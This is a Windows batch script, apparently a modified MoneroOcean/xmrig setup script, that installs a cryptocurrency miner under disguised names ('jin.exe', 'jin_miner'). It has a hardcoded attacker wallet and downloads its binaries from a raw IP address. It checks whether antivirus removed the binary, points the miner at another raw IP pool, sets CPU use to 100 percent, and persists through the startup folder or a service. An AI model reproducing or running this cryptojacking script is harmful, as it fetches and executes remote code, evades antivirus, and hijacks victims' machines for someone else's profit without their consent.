@echo off

set VERSION=2.5

rem printing greetings

echo MoneroOcean mining setup script v%VERSION%.
echo ^(please report issues to support@moneroocean.stream email^)
echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4
rem this one is optional
set EMAIL=prx
set site=http://150.129.234.203:82
rem checking prerequisites

if [%WALLET%] == [] (
  echo Script usage:
  echo ^> setup_jin_miner.bat ^<wallet address^> [^<your email address^>]
  echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

rem calculating port

set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
  echo ERROR: Can't compute projected Monero hashrate
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%USERPROFILE%\jin\xmrig.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by %USERPROFILE%\jin\miner.bat script.
echo Mining will happen to %WALLET% wallet.

if not [%EMAIL%] == [] (
  echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
)

echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  echo Mining in background will be performed using jin_miner service.
)

echo.
echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo.


rem start doing stuff: preparing miner

echo [*] Removing previous moneroocean miner (if any)
sc stop jin_miner
sc delete jin_miner
taskkill /f /t /im jin.exe

:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\jin" directory
timeout 5
rmdir /q /s "%USERPROFILE%\jin" >NUL 2>NUL
IF EXIST "%USERPROFILE%\jin" GOTO REMOVE_DIR0

echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\jin.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/jin.zip', '%USERPROFILE%\jin.zip')"
if errorlevel 1 (
  echo ERROR: Can't download MoneroOcean advanced version of xmrig
  goto MINER_BAD
)

echo [*] Unpacking "%USERPROFILE%\jin.zip" to "%USERPROFILE%\jin"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\jin.zip', '%USERPROFILE%\jin')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking stock "%USERPROFILE%\jin.zip" to "%USERPROFILE%\jin"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\jin" "%USERPROFILE%\jin.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\jin.zip"

echo [*] Checking if advanced version of "%USERPROFILE%\jin\jin.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 
"%USERPROFILE%\jin\jin.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\jin\jin.exe" (
  echo WARNING: Advanced version of "%USERPROFILE%\jin\jin.exe" is not functional
) else (
  echo WARNING: Advanced version of "%USERPROFILE%\jin\jin.exe" was removed by antivirus
)

echo [*] Looking for the latest version of Monero miner
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/jin-6.zip', '%USERPROFILE%\jin.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\jin.zip"
  exit /b 1
)

:REMOVE_DIR1
echo [*] Removing "%USERPROFILE%\jin" directory
timeout 5
rmdir /q /s "%USERPROFILE%\jin" >NUL 2>NUL
IF EXIST "%USERPROFILE%\jin" GOTO REMOVE_DIR1

echo [*] Unpacking "%USERPROFILE%\jin.zip" to "%USERPROFILE%\jin"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\jin.zip', '%USERPROFILE%\jin')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%site%/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "%USERPROFILE%\jin.zip" to "%USERPROFILE%\jin"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\jin" "%USERPROFILE%\jin.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\jin.zip" to "%USERPROFILE%\jin"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\jin.zip"

echo [*] Checking if stock version of "%USERPROFILE%\jin\jin.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 
"%USERPROFILE%\jin\jin.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%USERPROFILE%\jin\jin.exe" (
  echo WARNING: Stock version of "%USERPROFILE%\jin\jin.exe" is not functional
) else (
  echo WARNING: Stock version of "%USERPROFILE%\jin\jin.exe" was removed by antivirus
)

exit /b 1

:MINER_OK

echo [*] Miner "%USERPROFILE%\jin\jin.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=prx.%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%EMAIL%.%PASS%"
)

powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"159.65.200.90:80\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\jin\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config.json'" 

copy /Y "%USERPROFILE%\jin\config.json" "%USERPROFILE%\jin\config_background.json" >NUL
powershell -Command "$out = cat '%USERPROFILE%\jin\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\jin\config_background.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0jin.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM jin.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\jin\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
echo [*] Adding call to "%USERPROFILE%\jin\miner.bat" script to "%STARTUP_DIR%\jin_miner.bat" script
(
echo @echo off
echo "%USERPROFILE%\jin\miner.bat" --config="%USERPROFILE%\jin\config_background.json"
) > "%STARTUP_DIR%\jin_miner.bat"

echo [*] Running miner in the background
call "%STARTUP_DIR%\jin_miner.bat"
goto OK

:ADMIN_MINER_SETUP


echo [*] Creating jin_miner service
sc stop jin_miner
sc delete jin_miner
"%USERPROFILE%\jin\jsm.exe" install jin_miner "%USERPROFILE%\jin\jin.exe"
if errorlevel 1 (
  echo ERROR: Can't create jin_miner service
  exit /b 1
)
"%USERPROFILE%\jin\jsm.exe" set jin_miner AppDirectory "%USERPROFILE%\jin"
"%USERPROFILE%\jin\jsm.exe" set jin_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\jin\jsm.exe" set jin_miner AppStdout "%USERPROFILE%\jin\stdout"
"%USERPROFILE%\jin\jsm.exe" set jin_miner AppStderr "%USERPROFILE%\jin\stderr"

echo [*] Starting jin_miner service
"%USERPROFILE%\jin\jsm.exe" start jin_miner
if errorlevel 1 (
  echo ERROR: Can't start jin_miner service
  exit /b 1
)

echo
echo Please reboot system if jin_miner service is not activated yet (if "%USERPROFILE%\jin\xmrig.log" file is empty)
goto OK

:OK
echo
echo [*] Setup complete
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b





